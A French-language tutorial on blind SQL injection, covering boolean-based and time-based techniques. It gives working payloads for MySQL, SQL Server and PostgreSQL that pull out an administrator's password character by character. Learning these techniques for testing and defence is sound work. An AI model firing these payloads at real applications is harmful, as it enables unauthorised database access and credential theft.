C'est lorsque nous obtenons peu ou pas de retour pour confirmer si nos requêtes injectées ont réussi ou non, c'est parce que le les messages d'erreur ont été désactivés, mais l'injection fonctionne toujours malgré tout.

Nous avons deux types:

- Boolean
- Time Base
## Boolean

La clé pour découvrir une Blind SQL est de se baser sur une relation conditionnelle vrai ou faux. 

```sh
# Vrai
' and 'a'='a

# Faux
' and 'a'='b
```

- Si la request `vrai` affiche un contenu et la requete `faux` n'affiche pas alors le champ est vulnerable.

### Exploitation

Affiche la version du serveur 

```sql
' and substring(@@version,1,1)='0
-- Si sa ne fonctionne pas il faut incrementer la valeur de 0 a 1,2,3,4.... jusqu'a obtenir du contenu comme dans la requete `vrai`. Cela affiche le premier caractere de la version du serveur.
```

```sql
' AND (SELECT 'a' FROM users LIMIT 1)='a
-- confirmant qu'il existe une table appelée users.

' AND (SELECT 'a' FROM users WHERE username='administrator')='a
-- confirmant qu'il existe un utilisateur appelé administrator.

' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
-- déterminer le nombre de caractères du mot de passe de l' administrator. Cette condition doit être vraie, confirmant que le mot de passe comporte plus d'un caractère.

' AND SUBSTRING((SELECT password FROM users WHERE username = 'Administrator'), 1, 1) = 's

' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
-- confirmer que le premier caractère du mot de passe est s ou a
```

## Time Base

Au lieu de cela, votre indicateur d'une requête correcte est basé sur le temps que la requête prend pour se terminer. Ce délai est introduit en utilisant des méthodes intégrées telles que **`SLEEP(x)`** parallèlement à l'instruction UNION. 
La méthode sleep ne sera exécutée qu'après une instruction UNION SELECT réussie.

> S'il n'y a pas eu de pause dans le temps de réponse, on sait que la requête a échoué.

```sql
admin123' UNION SELECT SLEEP(5),2;--
```

#### Blind SQL injection by triggering time delays

Il est souvent possible d'exploiter la vulnérabilité d'injection SQL aveugle en déclenchant des délais selon que la condition injectée est vraie ou fausse.

Cela permet de déterminer la véracité de la condition injectée en fonction du temps nécessaire à la réception de la réponse HTTP.

> Les techniques de déclenchement d'un délai sont spécifiques au type de base de données utilisé.

```sql
-- sur Microsoft SQL Server,
'; IF (1=2) WAITFOR DELAY '0:0:10'--
'; IF (1=1) WAITFOR DELAY '0:0:10'--

-- sur PostgreSQL
';SELECT CASE WHEN (1=2) THEN pg_sleep(10) ELSE pg_sleep(0) END--
';SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--

'||pg_sleep(10)--
```

- La première de ces entrées ne déclenche pas de délai, car la condition 1=2 est fausse.
- La deuxième entrée déclenche un délai de 10 secondes, car la condition 1=1 est vraie.

```sql
';SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
-- délai de 10s si administrator existe

';SELECT CASE WHEN (username='administrator' AND LENGTH(password)>1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
-- délai de 10s, confirmant que le mot de passe comporte plus d'un caractère.

'; IF (SELECT COUNT(username) FROM users WHERE username = 'administrator' AND SUBSTRING(password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
';SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
-- délai de 10s, pour chaque caractere valide pour récupérer des données en testant un caractère à la fois cela teste le caractère à chaque position pour déterminer sa valeur.
```

